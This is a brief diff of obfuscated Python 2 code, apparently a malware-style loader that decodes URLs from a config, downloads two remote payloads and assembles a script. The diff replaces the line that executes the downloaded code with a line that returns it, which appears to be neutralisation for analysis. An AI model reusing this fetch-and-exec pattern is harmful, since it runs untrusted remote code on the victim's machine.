@@ -164,7 +164,7 @@ def main(*args, **kwargs):
             head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
             body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
             pkgs = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
-        exec '\n\n\n'.join([pkgs, body, head]) in globals()
+        return (pkgs, body, head)
 
 
 if __name__ == '__main__':
